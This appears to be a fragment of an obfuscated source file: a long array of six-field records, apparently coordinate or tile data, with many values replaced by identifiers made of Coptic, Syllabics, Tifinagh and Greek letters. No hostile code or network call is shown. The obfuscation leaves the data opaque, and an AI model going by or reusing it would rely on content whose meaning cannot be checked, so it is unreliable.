			[Ⲇᐃⵠ, "c", 0, 178, 276, 1],
			[1, "c", 0, 187, 265, ΔⲆⵠ],
			[ᐃⲆᐃ, "s", 1, 204, 260, ᐃⲆᐃ],
			[ΔⲆⵠ, "s", ⵠⲆΔ, 216, 260, ΔⲆⵠ],
			[1, "s", ᐃⲆᐃ, 187, ᐃⵠᐃᐃᐃⲆΔ, 1],
			[ⵠΔⲆ, "s", 2, 189, 254, 1],
			[1, "s", ⵠⵠⵠΔ, 212, 257, 1],
			[ΔΔΔ, "s", ⲆᐃᐃⲆ, 182, 286, 1],
			[ΔⲆⵠ, "s", ᐃⲆⵠᐃ, 169, 280, 1],
			[ⵠΔⲆ, "s", 2, 217, 273, 1],
			[ⵠⲆΔ, "s", ⲆⲆΔᐃ, 215, 282, 1],
			[ᐃⲆᐃ, "s", ⵠⵠΔⲆ, 172, 263, 1],
			[ᐃᐃⵠ, "s", ᐃⲆⵠᐃ, 176, 267, ᐃᐃⵠ],
			[ⵠΔⲆ, "s", ⵠⵠⵠΔ, 215, 251, 1],
			[ⵠΔᐃ, ⵠ[410], 1, 221, 282, 0],
			[1, ⵠ[410], ⵠΔⲆ, 222, 284, Δⵠᐃ],
			[ΔⲆⵠ, ⵠ[410], 1, 221, 290, 0],
			[ⵠⲆΔ, ⵠ[410], ᐃᐃⵠ, 222, 294, 0],
			[ⵠΔΔ, ⵠ[410], 1, 221, 297, 0],
			[1, ⵠ[410], 1, 223, 298, ⵠⲆⲆ],
			[1, ⵠ[410], 1, 222, 300, ΔⲆⲆ],
			[1, ⵠ[410], 1, 218, 301, 0],
			[1, ⵠ[410], 1, 217, 299, ᐃΔΔ],
			[1, ⵠ[410], Ⲇᐃⵠ, 215, 301, 0],
			[ᐃᐃⵠ, ⵠ[410], ᐃᐃⵠ, 212, 300, ᐃⵠΔ],
			[1, ⵠ[410], 1, 206, 300, 0],
			[ᐃⲆᐃ, ⵠ[410], ⵠΔΔ, 209, 301, 0],
			[ᐃᐃⵠ, ⵠ[410], ⵠΔⲆ, 204, 299, Δⵠᐃ],
			[Ⲇᐃⵠ, ⵠ[410], 1, 202, 301, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[410], 1, 199, 301, 0],
			[ᐃⲆᐃ, ⵠ[410], 1, 222, 282, ⲆΔⵠ],
			[ᐃⲆᐃ, ⵠ[410], ⵠΔⲆ, 207, 301, ⲆΔⵠ],
			[ΔΔΔ, ⵠ[410], ΔⲆⵠ, 197, 301, 0],
			[ⵠΔᐃ, ⵠ[410], 1, 215, 291, Δⵠᐃ],
			[1, ⵠ[410], 1, 216, 286, 0],
			[1, ⵠ[410], ⵠΔΔ, 214, 292, 0],
			[ᐃⲆᐃ, ⵠ[410], 1, 210, 289, Δⵠᐃ],
			[1, ⵠ[410], ΔΔΔ, 208, 294, 0],
			[ⵠΔᐃ, ⵠ[410], ⵠⲆΔ, 210, 298, ᐃⵠΔ],
			[1, ⵠ[410], ᐃⲆᐃ, 212, 281, 0],
			[ⵠΔΔ, ⵠ[410], 1, 219, 278, ⵠⲆⲆ],
			[1, ⵠ[410], ᐃⲆᐃ, 219, 282, ΔΔⵠ],
			[1, ⵠ[410], 1, 205, 286, 0],
			[1, ⵠ[410], 1, 202, 293, ᐃⵠΔ],
			[ᐃⲆᐃ, ⵠ[410], 1, 198, 295, ᐃΔΔ],
			[1, ⵠ[410], 2, 213, 282, 0],
			[ⵠΔΔ, ⵠ[410], 2, 213, 291, Δⵠᐃ],
			[ᐃⲆᐃ, ⵠ[410], 2, 216, 289, 0],
			[ᐃⲆᐃ, ⵠ[410], ΔⵠᐃⲆ, 219, 289, 0],
			[ⵠΔᐃ, ⵠ[410], ΔⵠᐃⲆ, 218, 285, 0],
			[1, ⵠ[410], 2, 220, 283, ΔΔⵠ],
			[1, ⵠ[410], ⵠⵠⵠΔ, 211, 283, ⵠⲆⲆ],
			[1, ⵠ[410], 2, 215, 281, ΔⲆⲆ],
			[ᐃⲆᐃ, ⵠ[410], 2, 217, 279, ᐃⵠⲆ],
			[ⵠΔⲆ, ⵠ[410], 2, 208, 290, 0],
			[1, ⵠ[410], ᐃⲆΔⲆ, 211, 296, 0],
			[ΔΔΔ, ⵠ[410], ΔⵠᐃⲆ, 215, 294, 0],
			[1, ⵠ[410], ⵠⵠⵠΔ, 212, 298, ΔΔⵠ],
			[1, ⵠ[410], 2, 203, 294, ΔⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[410], ⵠⵠⵠΔ, 204, 288, 0],
			[ᐃᐃⵠ, ⵠ[410], ⲆᐃᐃⲆ, 200, 294, 0],
			[1, ⵠ[410], 2, 198, 297, ΔΔⵠ],
			[1, ⵠ[410], ΔⵠᐃⲆ, 202, 299, 0],
			[1, ⵠ[410], ⲆⲆΔᐃ, 200, 299, 0],
			[ΔΔΔ, ⵠ[410], ΔⵠᐃⲆ, 220, 300, 0],
			[ⵠⲆΔ, ⵠ[410], ⵠⵠⵠΔ, 220, 295, 0],
			[1, ⵠ[410], 2, 220, 292, ΔΔⵠ],
			[ΔΔΔ, ⵠ[410], ⲆⲆΔᐃ, 219, 287, 0],
			[1, ⵠ[410], ᐃⲆⵠᐃ, 211, 288, 0],
			[ᐃⲆᐃ, ⵠ[410], ᐃⲆΔⲆ, 213, 287, 0],
			[ᐃᐃⵠ, ⵠ[410], ⵠⵠΔⲆ, 211, 289, ΔⲆⲆ],
			[ᐃᐃⵠ, ⵠ[410], ⲆᐃᐃⲆ, 212, 290, 0],
			[ⵠΔⲆ, ⵠ[410], 2, 195, 296, 0],
			[1, ⵠ[410], ⲆᐃᐃⲆ, 196, 299, 0],
			[1, ⵠ[410], 2, 194, 300, 0],
			[1, ⵠ[410], ⲆᐃᐃⲆ, 195, 300, 0],
			[1, ⵠ[410], ᐃⲆΔⲆ, 213, 279, ΔΔⵠ],
			[1, ⵠ[410], 2, 211, 279, 0],
			[ⵠΔᐃ, ⵠ[410], ᐃΔΔ, 218, 290, ᐃⵠΔ],
			[1, ⵠ[410], Δⵠᐃ, 212, 294, 0],
			[ᐃᐃⵠ, ⵠ[410], 1, 213, 295, ⵠⲆⲆ],
			[1, ⵠ[410], 1, 217, 292, ᐃⵠΔ],
			[ΔⲆⵠ, ⵠ[410], 1, 218, 288, ΔΔⵠ],
			[Ⲇᐃⵠ, ⵠ[410], 1, 210, 295, 0],
			[1, ⵠ[410], 1, 213, 292, 0],
			[1, ⵠ[410], ᐃᐃⵠ, 212, 289, 0],
			[ᐃⲆᐃ, ⵠ[410], 1, 205, 295, 0],
			[1, ⵠ[410], 2, 206, 296, Δⵠᐃ],
			[ⵠⲆΔ, ⵠ[410], ΔⵠᐃⲆ, 208, 296, ᐃⵠΔ],
			[1, ⵠ[410], 2, 221, 288, 0],
			[1, ⵠ[410], 2, 209, 299, 0],
			[1, ⵠ[410], 2, 211, 291, 0],
			[1, ⵠ[410], ⵠⲆΔ, 203, 275, 0],
			[ᐃᐃⵠ, ⵠ[410], ⵠⲆΔ, 204, 272, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[410], ΔⵠᐃⲆ, 205, 273, ΔΔⵠ],
			[ⵠΔΔ, ⵠ[410], ⲆⲆΔᐃ, 204, 276, 0],
			[ΔⲆⵠ, ⵠ[410], ⵠⵠⵠΔ, 202, 276, 0],
			[1, ⵠ[410], ᐃⲆΔⲆ, 199, 277, Δⵠᐃ],
			[1, ⵠ[410], ᐃⲆⵠᐃ, 202, 273, ⲆΔⵠ],
			[1, ⵠ[410], 2, 199, 270, 0],
			[1, ⵠ[410], ⵠⵠΔⲆ, 194, 274, 0],
			[1, ⵠ[410], ΔⵠᐃⲆ, 194, 277, ⵠⲆⲆ],
			[1, ⵠ[410], ⵠΔΔ, 192, 274, 0],
			[ᐃᐃⵠ, ⵠ[410], 1, 194, 267, 0],
			[1, ⵠ[410], ⲆᐃᐃⲆ, 194, 265, ᐃΔΔ],
			[Ⲇᐃⵠ, ⵠ[410], ᐃⲆΔⲆ, 190, 272, ᐃⵠⲆ],
			[1, ⵠ[410], ΔⵠᐃⲆ, 191, 275, ⲆΔⵠ],
			[ΔⲆⵠ, ⵠ[410], ⲆᐃᐃⲆ, 195, 274, ᐃⵠⲆ],
			[1, ⵠ[410], ⲆᐃᐃⲆ, 200, 271, 0],
			[ΔΔΔ, ⵠ[410], ᐃⲆᐃ, 168, 243, 0],
			[1, ⵠ[410], ⵠΔⲆ, 175, 240, ⵠⲆⲆ],
			[ᐃⲆᐃ, ⵠ[410], 1, 169, 234, 0],
			[1, ⵠ[410], ᐃᐃⵠ, 162, 235, 0],
			[1, ⵠ[410], 2, 169, 236, ⵠⲆⲆ],
			[1, ⵠ[410], ⵠⵠⵠΔ, 171, 234, Δⵠᐃ],
			[ⵠⲆΔ, ⵠ[410], 2, 165, 238, 0],
			[ⵠΔᐃ, ⵠ[410], ⲆⲆΔᐃ, 173, 241, ΔΔⵠ],
			[ⵠΔⲆ, ⵠ[410], ⵠⵠⵠΔ, 174, 238, ᐃⵠⲆ],
			[ⵠΔᐃ, ⵠ[410], ΔⵠᐃⲆ, 176, 240, ⲆΔⵠ],
			[1, ⵠ[410], ⲆⲆΔᐃ, 169, 244, 0],
			[ⵠΔᐃ, ⵠ[410], 2, 166, 243, ⲆΔⵠ],
			[1, ⵠ[410], 2, 162, 236, 0],
			[1, ⵠ[410], ᐃⲆⵠᐃ, 164, 235, ᐃⵠⲆ],
			[1, ⵠ[410], ⲆⲆΔᐃ, 162, 233, ᐃⵠⲆ],
			[ⵠΔΔ, ⵠ[410], 2, 163, 236, 0],
			[1, ⵠ[410], 2, 174, 242, ᐃⵠⲆ],
			[ΔⲆⵠ, ⵠ[410], 2, 171, 243, ᐃⵠⲆ],
			[Ⲇᐃⵠ, ⵠ[410], ΔΔΔ, 194, 206, 0],
			[1, ⵠ[410], ᐃᐃⵠ, 190, 214, ᐃⵠⲆ],
			[1, ⵠ[410], Ⲇᐃⵠ, 186, 206, 0],
			[ⵠΔᐃ, ⵠ[410], 1, 197, 207, ᐃⵠⲆ],
			[ΔⲆⵠ, ⵠ[410], ᐃⲆΔⲆ, 196, 208, 0],
			[1, ⵠ[410], ΔⵠᐃⲆ, 198, 206, 0],
			[ⵠΔⲆ, ⵠ[410], ᐃⲆⵠᐃ, 198, 208, ΔΔⵠ],
			[ΔΔΔ, ⵠ[410], ΔⵠᐃⲆ, 194, 204, ᐃΔΔ],
			[ⵠΔⲆ, ⵠ[410], ᐃⲆⵠᐃ, 187, 206, 0],
			[ΔⲆⵠ, ⵠ[410], ⵠⵠⵠΔ, 186, 204, ΔΔⵠ],
			[ⵠⲆΔ, ⵠ[410], ⲆⲆΔᐃ, 189, 214, ΔΔⵠ],
			[1, ⵠ[410], ⲆⲆΔᐃ, 189, 213, ΔΔⵠ],
			[1, ⵠ[410], 2, 193, 215, 0],
			[1, ⵠ[410], ⲆⲆΔᐃ, 194, 214, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[410], 2, 187, 215, ⲆΔⵠ],
			[ΔⲆⵠ, ⵠ[410], 2, 193, 209, ⵠⲆⲆ],
			[ⵠΔⲆ, ⵠ[410], 2, 189, 211, ᐃⵠΔ],
			[1, ⵠ[410], 2, 187, 209, 0],
			[1, ⵠ[410], 2, 187, 207, Δⵠᐃ],
			[ΔⲆⵠ, ⵠ[410], ⵠⵠΔⲆ, 191, 205, 0],
			[1, ⵠ[410], ΔⵠᐃⲆ, 189, 203, 0],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆⵠᐃ, 224, 176, ⵠΔΔ],
			[Ⲇᐃⵠ, ⵠ[568], 0, 224, 177, 1],
			[ⵠΔⲆ, ⵠ[568], ⲆᐃΔᐃ, 224, 178, 1],
			[1, ⵠ[568], 2, 224, 179, ΔⲆⵠ],
			[1, ⵠ[568], 1, 224, 180, 1],
			[ⵠΔᐃ, ⵠ[568], ⵠⵠⵠΔ, 224, 181, 1],
			[1, ⵠ[568], 0, 224, 182, ΔⲆⵠ],
			[ⵠΔⲆ, ⵠ[568], 2, 224, 183, 1],
			[ⵠΔᐃ, ⵠ[568], Δⵠᐃ, 224, 184, 1],
			[ΔⲆⵠ, ⵠ[568], 3, 224, 185, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 224, 186, 1],
			[1, ⵠ[568], 0, 224, 187, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 224, 188, ⵠΔⲆ],
			[1, ⵠ[568], 0, 224, 189, 1],
			[1, ⵠ[568], 1, 224, 190, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 224, 191, 1],
			[1, ⵠ[568], 0, 224, 192, ⵠΔᐃ],
			[ᐃᐃⵠ, ⵠ[568], ᐃⲆΔⲆ, 224, 193, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 224, 194, 1],
			[1, ⵠ[568], ΔΔΔ, 224, 195, 1],
			[ⵠΔᐃ, ⵠ[568], ⲆⲆΔᐃ, 224, 196, 1],
			[1, ⵠ[568], ᐃⵠⲆ, 224, 197, ᐃⲆᐃ],
			[ⵠΔᐃ, ⵠ[568], 3, 224, 198, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 224, 199, ᐃᐃⵠ],
			[1, ⵠ[568], ⵠΔΔ, 224, 200, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 224, 201, 1],
			[1, ⵠ[568], ΔⲆᐃⲆ, 224, 202, 1],
			[ⵠⲆΔ, ⵠ[568], 0, 224, 203, ⵠΔΔ],
			[ⵠΔᐃ, ⵠ[568], ⵠΔΔ, 224, 204, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 224, 205, ⵠΔᐃ],
			[ᐃᐃⵠ, ⵠ[568], 0, 224, 206, ⵠⲆΔ],
			[Ⲇᐃⵠ, ⵠ[568], ᐃⲆᐃ, 224, 207, 1],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 224, 208, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 224, 209, Ⲇᐃⵠ],
			[ⵠΔΔ, ⵠ[568], ⲆⲆΔᐃ, 224, 210, ⵠⲆΔ],
			[1, ⵠ[568], 0, 223, 211, 1],
			[ᐃᐃⵠ, ⵠ[568], Ⲇᐃⵠ, 224, 211, 1],
			[ⵠΔᐃ, ⵠ[568], 2, 224, 212, ⵠΔᐃ],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆΔⲆ, 224, 213, 1],
			[1, ⵠ[568], 1, 224, 214, 1],
			[1, ⵠ[568], 3, 224, 215, 1],
			[ⵠΔⲆ, ⵠ[568], ᐃΔΔ, 224, 216, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃᐃⵠ, 224, 217, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], 2, 224, 218, 1],
			[ⵠΔᐃ, ⵠ[568], 3, 224, 219, 1],
			[1, ⵠ[568], ᐃⵠΔ, 223, 215, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃⲆΔⲆ, 223, 214, ΔΔΔ],
			[ᐃⲆᐃ, ⵠ[568], ⲆᐃᐃⲆ, 223, 212, ΔⲆⵠ],
			[1, ⵠ[568], 2, 223, 216, 1],
			[1, ⵠ[568], 3, 223, 217, ⵠΔΔ],
			[ΔⲆⵠ, ⵠ[568], 0, 223, 218, 1],
			[1, ⵠ[568], 0, 224, 220, 1],
			[ΔΔΔ, ⵠ[568], ΔΔⵠ, 224, 222, 1],
			[1, ⵠ[568], ⲆΔⵠ, 223, 209, ⵠΔᐃ],
			[ⵠⲆΔ, ⵠ[568], ᐃΔΔ, 223, 205, 1],
			[ᐃᐃⵠ, ⵠ[568], 2, 224, 221, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 223, 219, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 223, 220, ⵠΔΔ],
			[ⵠⲆΔ, ⵠ[568], 2, 223, 213, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 223, 210, 1],
			[1, ⵠ[568], ᐃⲆᐃ, 223, 178, 1],
			[1, ⵠ[568], 3, 223, 179, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⵠⵠᐃ, 223, 181, 1],
			[1, ⵠ[568], ⲆΔⵠⵠ, 223, 182, ⵠⲆΔ],
			[ⵠΔᐃ, ⵠ[568], 1, 223, 185, 1],
			[ⵠΔᐃ, ⵠ[568], ⵠⵠΔⲆ, 223, 184, ⵠΔⲆ],
			[1, ⵠ[568], 2, 223, 186, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃΔΔ, 223, 180, 1],
			[1, ⵠ[568], 0, 223, 183, ⵠΔΔ],
			[ΔⲆⵠ, ⵠ[568], ⵠⵠΔⲆ, 223, 187, ΔⲆⵠ],
			[1, ⵠ[568], ΔΔΔ, 223, 188, ᐃᐃⵠ],
			[ⵠⲆΔ, ⵠ[568], 2, 223, 189, 1],
			[ᐃⲆᐃ, ⵠ[568], ⵠⵠⵠΔ, 223, 190, ᐃⲆᐃ],
			[1, ⵠ[568], 3, 223, 191, ᐃᐃⵠ],
			[1, ⵠ[568], ⵠΔΔ, 223, 192, ΔⲆⵠ],
			[ᐃᐃⵠ, ⵠ[568], ⵠⵠΔⲆ, 223, 193, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 223, 194, ⵠⲆΔ],
			[1, ⵠ[568], ⲆΔⵠⵠ, 223, 195, 1],
			[ΔⲆⵠ, ⵠ[568], 1, 223, 196, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 223, 197, ⵠΔᐃ],
			[ΔⲆⵠ, ⵠ[568], ᐃⲆⵠᐃ, 223, 199, ΔΔΔ],
			[ᐃᐃⵠ, ⵠ[568], ᐃⲆⵠᐃ, 223, 198, Ⲇᐃⵠ],
			[1, ⵠ[568], ⵠⲆⲆ, 223, 200, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 223, 201, 1],
			[Ⲇᐃⵠ, ⵠ[568], Δⵠᐃ, 223, 202, 1],
			[1, ⵠ[568], 3, 223, 203, 1],
			[1, ⵠ[568], ⲆᐃΔᐃ, 223, 204, ΔΔΔ],
			[ⵠΔⲆ, ⵠ[568], ΔⲆᐃⲆ, 223, 206, 1],
			[ᐃⲆᐃ, ⵠ[568], 3, 223, 207, 1],
			[ᐃᐃⵠ, ⵠ[568], 3, 223, 208, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⲆⲆΔᐃ, 223, 221, ΔⲆⵠ],
			[1, ⵠ[568], 2, 223, 222, 1],
			[1, ⵠ[568], ᐃⵠⲆ, 223, 224, ⵠⲆΔ],
			[1, ⵠ[568], ᐃⵠⲆ, 224, 228, 1],
			[ᐃᐃⵠ, ⵠ[568], Δⵠᐃ, 224, 230, ⵠΔΔ],
			[1, ⵠ[568], 0, 223, 234, ᐃⲆᐃ],
			[ⵠΔΔ, ⵠ[568], ΔⵠᐃⲆ, 223, 223, 1],
			[1, ⵠ[568], 2, 224, 223, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 224, 224, Ⲇᐃⵠ],
			[ΔⲆⵠ, ⵠ[568], ᐃⲆⵠᐃ, 224, 225, 1],
			[1, ⵠ[568], ᐃᐃⵠ, 223, 226, 1],
			[1, ⵠ[568], 1, 224, 231, 1],
			[1, ⵠ[568], 1, 223, 232, 1],
			[ⵠΔⲆ, ⵠ[568], 3, 223, 225, ΔⲆⵠ],
			[ᐃⲆᐃ, ⵠ[568], 3, 224, 226, ᐃᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], ᐃᐃⲆⲆ, 223, 227, 1],
			[ⵠΔⲆ, ⵠ[568], 3, 224, 227, ⵠⲆΔ],
			[ⵠΔΔ, ⵠ[568], 3, 223, 229, 1],
			[1, ⵠ[568], 3, 223, 228, ⵠΔⲆ],
			[ⵠΔⲆ, ⵠ[568], 3, 224, 229, ⵠΔⲆ],
			[ⵠΔⲆ, ⵠ[568], 3, 223, 230, 1],
			[1, ⵠ[568], ΔⲆΔᐃ, 223, 231, 1],
			[1, ⵠ[568], 3, 224, 232, ⵠΔⲆ],
			[ᐃᐃⵠ, ⵠ[568], 3, 224, 233, ⵠⲆΔ],
			[1, ⵠ[568], ΔⲆᐃⲆ, 223, 233, 1],
			[ᐃⲆᐃ, ⵠ[568], 3, 224, 234, Ⲇᐃⵠ],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 224, 235, ΔΔΔ],
			[1, ⵠ[568], 3, 223, 235, ᐃᐃⵠ],
			[1, ⵠ[568], ΔⲆⵠ, 224, 236, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 223, 236, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 223, 237, 1],
			[1, ⵠ[568], 3, 224, 237, ⵠΔⲆ],
			[ᐃⲆᐃ, ⵠ[568], ΔⲆᐃⲆ, 224, 238, 1],
			[ΔΔΔ, ⵠ[568], Δⵠᐃ, 224, 239, ᐃⲆᐃ],
			[1, ⵠ[568], 1, 223, 241, ⵠΔΔ],
			[ΔΔΔ, ⵠ[568], ᐃΔΔ, 224, 243, ΔΔΔ],
			[ⵠΔᐃ, ⵠ[568], 0, 223, 245, ΔΔΔ],
			[1, ⵠ[568], ΔⲆⲆ, 224, 247, ⵠⲆΔ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 223, 240, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 223, 239, ⵠΔΔ],
			[1, ⵠ[568], 2, 224, 240, 1],
			[1, ⵠ[568], 2, 224, 241, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃⲆΔⲆ, 224, 242, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], ΔⵠᐃⲆ, 223, 242, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 223, 243, ΔΔΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 223, 244, ΔⲆⵠ],
			[ⵠΔΔ, ⵠ[568], ⵠⵠΔⲆ, 224, 244, ⵠⲆΔ],
			[ⵠⲆΔ, ⵠ[568], 2, 224, 245, ΔΔΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 224, 246, ⵠΔⲆ],
			[1, ⵠ[568], 3, 223, 238, Ⲇᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], ᐃᐃⲆⲆ, 223, 246, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 223, 247, 1],
			[1, ⵠ[568], ⵠΔᐃ, 223, 249, ⵠⲆΔ],
			[ᐃⲆᐃ, ⵠ[568], ⵠΔᐃ, 224, 253, ᐃⲆᐃ],
			[1, ⵠ[568], ⵠΔᐃ, 223, ᐃⲆᐃᐃⵠⵠⲆ, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[568], ᐃⵠⲆ, 223, 254, 1],
			[ᐃⲆᐃ, ⵠ[568], 0, 224, 250, ⵠΔΔ],
			[1, ⵠ[568], ΔⲆΔᐃ, 223, 248, ΔΔΔ],
			[ⵠΔΔ, ⵠ[568], ⲆᐃΔᐃ, 223, 250, 1],
			[ⵠΔΔ, ⵠ[568], 3, 223, 252, 1],
			[1, ⵠ[568], ⲆᐃΔᐃ, 223, ΔⵠⲆⵠᐃ, ΔⲆⵠ],
			[1, ⵠ[568], ⲆᐃΔᐃ, 223, 257, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 224, 248, 1],
			[ΔⲆⵠ, ⵠ[568], ⲆᐃᐃⲆ, 224, 249, 1],
			[ⵠΔΔ, ⵠ[568], ⲆᐃᐃⲆ, 223, 251, ⵠΔΔ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 224, 251, 1],
			[1, ⵠ[568], 2, 224, 252, ⵠⲆΔ],
			[ⵠⲆΔ, ⵠ[568], 2, 223, 253, 1],
			[1, ⵠ[568], 2, 224, 254, ⵠⲆΔ],
			[ⵠⲆΔ, ⵠ[568], 2, 224, 255, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 224, ΔΔᐃⲆⲆⵠⵠ, ⵠΔᐃ],
			[ᐃᐃⵠ, ⵠ[568], ᐃⲆΔⲆ, 224, 257, 1],
			[1, ⵠ[568], 0, 224, 258, ⵠⲆΔ],
			[1, ⵠ[568], ᐃⵠΔ, 223, 261, ᐃⲆᐃ],
			[1, ⵠ[568], 0, 224, 263, 1],
			[ⵠⲆΔ, ⵠ[568], Δⵠᐃ, 224, 266, ⵠⲆΔ],
			[ᐃᐃⵠ, ⵠ[568], 0, 224, 272, 1],
			[1, ⵠ[568], ΔⲆⲆ, 223, 270, 1],
			[ⵠⲆΔ, ⵠ[568], ⲆΔⵠ, 223, 275, 1],
			[1, ⵠ[568], 1, 223, 259, 1],
			[ⵠΔΔ, ⵠ[568], 1, 223, 264, 1],
			[Ⲇᐃⵠ, ⵠ[568], 1, 223, 268, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃⲆᐃ, 224, 274, 1],
			[1, ⵠ[568], 2, 223, 258, ⵠΔⲆ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 223, 260, ⵠΔⲆ],
			[ΔⲆⵠ, ⵠ[568], 2, 223, 263, 1],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆⵠᐃ, 223, 265, ᐃⲆᐃ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 223, 267, 1],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆΔⲆ, 223, 271, 1],
			[1, ⵠ[568], 2, 223, 273, 1],
			[ᐃⲆᐃ, ⵠ[568], 3, 223, 262, Ⲇᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 3, 223, 266, 1],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 223, 269, 1],
			[1, ⵠ[568], ⵠⵠⵠᐃ, 223, 272, Ⲇᐃⵠ],
			[1, ⵠ[568], ΔⲆᐃⲆ, 223, 274, 1],
			[ᐃⲆᐃ, ⵠ[568], ⵠⵠⵠᐃ, 224, 275, ⵠΔΔ],
			[ⵠΔⲆ, ⵠ[568], 3, 224, 273, 1],
			[1, ⵠ[568], ⲆᐃΔᐃ, 224, 271, 1],
			[1, ⵠ[568], ᐃⲆΔⵠ, 224, 270, 1],
			[ΔⲆⵠ, ⵠ[568], ⲆΔⵠⵠ, 224, 269, 1],
			[1, ⵠ[568], 3, 224, 268, ⵠΔΔ],
			[ΔΔΔ, ⵠ[568], ᐃᐃⲆⲆ, 224, 267, ⵠⲆΔ],
			[1, ⵠ[568], ΔⲆᐃⲆ, 224, 265, ⵠⲆΔ],
			[ⵠΔᐃ, ⵠ[568], ΔⲆᐃⲆ, 224, 264, ΔⲆⵠ],
			[1, ⵠ[568], ΔⲆᐃⲆ, 224, 262, ΔⲆⵠ],
			[ΔⲆⵠ, ⵠ[568], 3, 224, 261, ΔΔΔ],
			[ΔΔΔ, ⵠ[568], 3, 224, 260, 1],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 224, 259, ΔⲆⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 223, 276, 1],
			[ΔΔΔ, ⵠ[568], 1, 224, 276, 1],
			[1, ⵠ[568], ᐃᐃⵠ, 224, 280, ⵠΔᐃ],
			[1, ⵠ[568], 1, 223, 281, 1],
			[1, ⵠ[568], 1, 224, 286, ᐃᐃⵠ],
			[1, ⵠ[568], 0, 223, 280, 1],
			[1, ⵠ[568], ᐃⵠΔ, 223, 284, 1],
			[1, ⵠ[568], 0, 224, 288, 1],
			[1, ⵠ[568], 0, 224, 279, 1],
			[1, ⵠ[568], 2, 223, 277, ΔⲆⵠ],
			[ᐃᐃⵠ, ⵠ[568], 2, 224, 277, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 224, 278, ⵠΔᐃ],
			[1, ⵠ[568], 2, 224, 281, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 224, 283, 1],
			[1, ⵠ[568], 2, 224, 282, 1],
			[ⵠΔᐃ, ⵠ[568], 2, 224, 284, 1],
			[ΔΔΔ, ⵠ[568], ⲆⲆΔᐃ, 224, 285, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 224, 287, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 223, 287, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 223, 285, ⵠΔⲆ],
			[1, ⵠ[568], 2, 223, 283, 1],
			[1, ⵠ[568], 2, 223, 279, Ⲇᐃⵠ],
			[1, ⵠ[568], ⲆΔⵠⵠ, 223, 278, 1],
			[1, ⵠ[568], ᐃⲆΔⵠ, 223, 282, ΔΔΔ],
			[1, ⵠ[568], 3, 223, 286, 1],
			[1, ⵠ[568], 3, 223, 289, ᐃⲆᐃ],
			[ⵠΔΔ, ⵠ[568], ᐃⲆᐃᐃ, 224, 289, 1],
			[ΔΔΔ, ⵠ[568], ⲆᐃᐃⲆ, 223, 288, 1],
			[ᐃᐃⵠ, ⵠ[568], ΔⵠᐃⲆ, 224, 290, 1],
			[1, ⵠ[568], ᐃⲆᐃ, 223, 290, ⵠΔΔ],
			[ΔΔΔ, ⵠ[568], 0, 224, 292, ⵠΔⲆ],
			[ⵠΔᐃ, ⵠ[568], ⵠⲆⲆ, 223, 294, ΔΔΔ],
			[1, ⵠ[568], ⲆΔⵠ, 224, 297, ⵠΔΔ],
			[ᐃⲆᐃ, ⵠ[568], 0, 223, 299, 1],
			[ⵠΔᐃ, ⵠ[568], ᐃⲆΔⲆ, 223, 291, ⵠΔᐃ],
			[ᐃⲆᐃ, ⵠ[568], 2, 224, 291, ⵠΔⲆ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 223, 292, 1],
			[ΔΔΔ, ⵠ[568], ΔⵠᐃⲆ, 223, 293, 1],
